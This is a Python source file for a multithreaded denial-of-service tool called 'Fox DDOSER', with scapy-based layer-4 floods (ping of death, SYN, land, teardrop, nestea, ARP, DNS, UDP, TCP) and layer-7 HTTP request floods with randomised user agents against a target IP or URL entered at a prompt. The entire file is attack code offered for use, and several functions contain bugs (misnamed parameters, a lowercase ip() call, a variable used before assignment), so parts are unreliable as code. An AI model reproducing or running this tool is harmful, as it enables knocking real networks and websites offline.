from scapy.all import *
import socket
import threading
import random
import pyuseragents
import requests
from rainbowtext import text as rain
import pyfiglet , colorama

rd = colorama.Fore.RED
cv = colorama.Fore.WHITE
bl = colorama.Fore.BLUE
gn = colorama.Fore.GREEN
yl = colorama.Fore.YELLOW
mag = colorama.Fore.MAGENTA
cy = colorama.Fore.CYAN
lgn = colorama.Fore.LIGHTGREEN_EX

def banner():
    figlet = pyfiglet.Figlet(font="script").renderText("Fox DDOSER")
    return figlet




def ping_of_death(ip_target):
    i = 0
    while True:
        send(IP(dst=ip_target , ttl=132 , id=1111)/ICMP()/(b"Sdadad"*8192) , verbose=0)
        print ("Sent : %s\n" % str(i) , end="\r")
        i = i + 1
def syn_attack(ip_target):
    i = 0
    while True:
        ip = IP(dst=ip_target,id=1111,ttl=99)
        tcp = TCP(sport=RandShort() , dport=80 ,seq=12345,ack=1000,windows=1000, flags="S")
        data = b"MRadikal" * 8192
        send(ip / tcp / data , verbose=0)
        print ("Sent : %s\n" % str(i) , end="\r")
        i = i + 1
def malformed_attack(ip_target):
    i = 0
    while True:
        ip = IP(dst=ip_target , ihl=2 , version=3 , ttl=52 , id=112)
        icmp = ICMP()
        send(ip / icmp , verbose=0)
        print ("Sent : %s\n" % str(i) , end="\r")
        i = i + 1
def land_attack(ip_target):
    i = 0
    while True:
        ip = IP(dst=ip_target,src=ip_target , id=78 , ttl=92)
        tcp = TCP(sport=135,dport=135)
        send(ip / tcp , verbose=0)
        print ("Sent : %s\n" % str(i) , end="\r")
        i = i + 1

def nestea_attack(ip_target):
    i =0 
    while True:
        ip = ip(dst=ip_target,id=42,flags="MF")
        data = b"ZZZZ" * 1024
        send(ip / UDP() / data , verbose=0)
        print ("Sent : %s\n" % str(i) , end="\r")
        i = i + 1
def udp_attack(ip_target):
    i=0
    while True:
        ip = IP(dst=ip_target)
        udp = fuzz(UDP())
        send(ip / udp , verbose=0)
        print ("Sent : %s\n" % str(i) , end="\r")
        i = i + 1
def arp_attack(ip_target):
    ether = Ether(dst="FF:FF:FF:FF:FF:FF")
    arp = ARP(psrc=RandIP , pdst=ip_target)
    srpflood(ether / arp)
        
def teardrop_attack(ip_target):
    i = 0
    while True:
        ip = IP(dst=ip_target,flags=0,proto=17,frags=3)
        data = ("\x00" * 100)
        ips = IP(dst=ip_target,flags="MF",proto=17,frag=18)
        send(ip / data , verbose=0)
        send(ips / data , verbose=0)
        print ("Sent : %s\n" % str(i) , end="\r")
        i = i + 2

def dns_spoofing(ip_target):
    i = 0
    while True:
        ip = IP(dst=ip_target , ttl=12)
        udp = UDP(sport=RandShort() , dport=53)
        dns = DNS(qd=DNSQR(qname="secdev.org",qtype="A"))
        send(ip / udp / dns)
        print ("Sent : %s\n" % str(i) , end="\r")
        i = i + 1



def tcp_attack(ip_target):
    sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    sent = 0
    port = 80
    while True:
        bytes = random._urandom(1769)
        sock.sendto(bytes, (ip_target,port))
        sent = sent + 1
        port = port + 1
        print ("Sent %s packet to %s on port:%s"%(sent,ip_target,port) , end="\r")
        if port == 65534:
            port = 1

def GET_attack(url_target):
    useragent = pyuseragents.random()
    header = {"User-Agent":useragent}
    i = 0
    while True:
        requests.get(url_target , headers=header)
        print ("Sent : %s\n" % str(i) , end="\r")
        i = i + 1

def POST_attack(url_target):
    useragent = pyuseragents.random()
    header = {"User-Agent":useragent}
    i = 0
    while True:
        requests.post(url_target , headers=header)
        print ("Sent : %s\n" % str(i) , end="\r")
        i = i + 1

def HEAD_attack(url_target):
    useragent = pyuseragents.random()
    header = {"User-Agent":useragent}
    i = 0
    while True:
        requests.head(url_target , headers=header)
        print ("Sent : %s\n" % str(i) , end="\r")
        i = i + 1
def PUT_attack(url_target):
    useragent = pyuseragents.random()
    header = {"User-Agent":useragent}
    print ("Sent : %s\n" % str(i) , end="\r")
    i = 0
    while True:
        requests.put(url_target , headers=header)
        print ("Sent : %s\n" % str(i))
        i = i + 1
def OPTIONS_attack(url_target):
    useragent = pyuseragents.random()
    header = {"User-Agent":useragent}
    i = 0
    while True:
        requests.options(url_target , headers=header)
        print ("Sent : %s\n" % str(i) , end="\r")
        i = i + 1


print(rain(banner()))
print (rain("""
|==============================|
|         Black Fox            |
|       Security Team          |
|  Author : Maximum Radikali   |
|    DDOSER Layer 4 , Layer 7  |
|==============================|
"""))
layer = input(cy + "[-] layer4\n[-] layer7\n\n ~ Select a layer to continue -> ")

if layer == "layer4":
    ip_target = input(rd + "Please Enter Your Target IP - > ")
    socketx = int(input(yl + "Please Enter Socket Worker ex : (10) - > "))
    methods = input(gn + "[^] pod\n[^] syn\n[^] mfd (malformed Attack)\n[^] land\n[^] arp\n[^] nestea\n[^] dns\n[^] tear (Tear Drop Attack)\n[^] tcp\n[^] udp\n\n[~] Please Enter a method : ")
    if methods == "pod":
        for i in range(socketx):
            threading.Thread(target=ping_of_death , args=(ip_target,)).start()
    elif methods == "syn":
        for i in range(socketx):
            threading.Thread(target=syn_attack() , args=(ip_target,)).start()
    elif methods == "mfd":
        for i in range(socketx):
            threading.Thread(target=malformed_attack , args=(ip_target,)).start()
    elif methods == "land":
        for i in range(socketx):
            threading.Thread(target=land_attack , args=(ip_target,)).start()
    elif methods == "arp":
        print ("Attacking Start Now  .... !")
        for i in range(socketx):
            threading.Thread(target=arp_attack , args=(ip_target,)).start()
    elif methods == "nestea":
        for i in range(socketx):
            threading.Thread(target=nestea_attack , args=(ip_target,)).start()
    elif methods == "dns":
        for i in range(socketx):
            threading.Thread(target=dns_spoofing , args=(ip_target,)).start()
    elif methods == "tear":
        for i in range(socketx):
            threading.Thread(target=teardrop_attack , args=(ip_target,)).start()
    elif methods == "udp":
        for i in range(socketx):
            threading.Thread(target=udp_attack , args=(ip_target,)).start()
    elif methods == "tcp":
        for i in range(socketx):
            threading.Thread(target=tcp_attack , args=(ip_target,)).start()
if layer == "layer7":
    url_target = input(bl + "[-] Please Enter Your Target URL : ")
    worker = int(input(mag + "[=] Please Enter Your Thread Worker : "))
    methods = input(lgn + "[$] GET\n[$] POST\n[$] PUT\n[$] HEAD\n[$] OPTIONS\n\n[*] Please Enter a Method : ")
    if methods == "GET":
        for x in range(worker):
            threading.Thread(target=GET_attack,args=(url_target,)).start()
    if methods == "POST":
        for x in range(worker):
            threading.Thread(target=POST_attack,args=(url_target,)).start()
    if methods == "PUT":
        for x in range(worker):
            threading.Thread(target=PUT_attack,args=(url_target,)).start()
    if methods == "HEAD":
        for x in range(worker):
            threading.Thread(target=HEAD_attack,args=(url_target,)).start()
    if methods == "OPTIONS":
        for x in range(worker):
            threading.Thread(target=OPTIONS_attack,args=(url_target,)).start()
